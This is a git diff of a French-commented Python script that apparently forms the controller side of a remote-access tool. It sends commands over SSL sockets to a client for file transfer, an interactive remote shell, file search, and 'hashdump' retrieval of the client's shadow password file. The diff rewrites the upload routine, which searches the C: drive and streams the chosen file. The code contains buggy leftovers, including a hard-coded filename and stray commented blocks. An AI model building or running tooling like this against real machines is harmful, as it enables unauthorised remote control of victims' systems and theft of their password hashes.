@@ -18,21 +18,43 @@ def download(client_socket):
 
 # Fonction permettant de charger un fichier du serveur vers le client
 def upload(ssl_socket):
+    filename = input("[?] Entrez le nom du fichier à envoyer : ") # Récupération saisie du nom du fichier
     while True:
-        filename = input("[?] Entrez le nom du fichier à envoyer : ") # Récupération saisie du nom du fichier
         if filename.strip() == "": # Check si le fichier est vide
             print("[!] Le nom du fichier ne peut pas être vide !")
         else:
             break
+
     results = []
     disk_root = "C:\\"
     for root, dirs, files in os.walk(disk_root):
         if filename in files:
             results.append(os.path.join(root, filename))
-    return results
+    if results:
+        print("[*] Voici les fichiers trouvés :")
+        for result, filepath in enumerate(results):
+            print(f"    => {result + 1} - {filepath}")
+        while True:
+            try:
+                choice = int(input("Entrez le numéro de fichier à envoyer :"))
+                if 0 < choice <= len(results):
+                    filepath = results[choice-1]
+                    ssl_socket.send(b'upload') # Envoie de la commande
+                    ssl_socket.send(b'filename.txt') # Envoie du nom de fichier
+                    with open(filepath, 'rb') as f:
+                        while (chunk := f.read(4096)):
+                            ssl_socket.sendall(chunk)
+                    break
+                else:
+                    print("Numéro invalide. Veuillez saisir un numéro dans la liste :")
+            except ValueError:
+                print("Entrée invalide. Veuillez saisir un numéro valide.")
+    else:
+        print(f"Aucun fichier correspondant au nom '{filename}' n'a été trouvé")
+
     
-    """"
-    ssl_socket.send(b'upload') # Envoi de la commande       
+"""
+    client_socket.send(b'upload') # Envoi de la commande       
     ###ssl_socket.send(filename.encode())
 with open(filename, 'rb') as file:
         while True:
@@ -44,8 +66,8 @@ print({filename})
 print(f"[+] Le fichier '{filename}' a été envoyé avec succès.")
         #except Exception as e:
         ##print(f"[!] Erreur lors de l'envoi du fichier '{filename}': {str(e)}")
-        
-"""
+"""        
+
 # Fonction permettant d'initier un shell intéractif sur le client
 def shell(client_socket, client_ip):
     client_socket.send(b'shell')  # Envoie de la commande
@@ -100,9 +122,6 @@ def search(client_socket) :
 # Fonction permettant de récupérer le fichier shadow du client
 def hashdump(client_socket):
     client_socket.send(b'hashdump')  # Envoie de la commande
-
-
-
 
 def main():
     # Récupération et définition des variables
